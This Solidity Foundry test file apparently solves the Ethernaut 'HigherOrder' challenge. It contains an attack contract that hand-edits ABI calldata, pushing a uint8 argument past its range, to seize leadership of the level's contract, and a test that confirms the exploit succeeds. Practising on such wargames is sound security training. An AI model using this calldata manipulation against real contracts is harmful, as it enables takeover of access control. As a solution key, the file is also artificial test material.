// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utils} from "test/utils/Utils.sol";

import {DummyFactory} from "src/levels/DummyFactory.sol";
import {Level} from "src/levels/base/Level.sol";
import {Ethernaut} from "src/Ethernaut.sol";

interface HigherOrder {
    function claimLeadership() external;
    function registerTreasury(bytes32) external;
}

contract HigherOrderAttack {
    function encodedData() public pure returns (bytes memory) {
        return abi.encodeWithSignature("registerTreasury(uint8)", uint8(42));
    }

    function injectedData() public pure returns (bytes memory) {
        bytes memory data = encodedData();
        data[21] = hex"FF";
        return data;
    }

    function attack(address victim) public {
        (bool response,) = address(victim).call(injectedData());
        if (!response) revert();
    }
}

contract TestHigherOrder is Test, Utils {
    Ethernaut ethernaut;
    HigherOrder instance;

    address payable owner;
    address payable player;

    /*//////////////////////////////////////////////////////////////
                                 HELPERS
    //////////////////////////////////////////////////////////////*/

    function setUp() public {
        address payable[] memory users = createUsers(2);

        owner = users[0];
        vm.label(owner, "Owner");

        player = users[1];
        vm.label(player, "Player");

        vm.startPrank(owner);
        ethernaut = getEthernautWithStatsProxy(owner);
        DummyFactory factory = DummyFactory(getOldFactory("HigherOrderFactory"));
        ethernaut.registerLevel(Level(address(factory)));
        vm.stopPrank();

        vm.startPrank(player);
        instance = HigherOrder(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                                 TESTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Check the intial state of the level and enviroment.
    function testInit() public {
        vm.startPrank(player);
        assertFalse(submitLevelInstance(ethernaut, address(instance)));
    }

    /// @notice Test the solution for the level.
    function testSolve() public {
        vm.startPrank(player, player);

        new HigherOrderAttack().attack(address(instance));
        instance.claimLeadership();

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
}
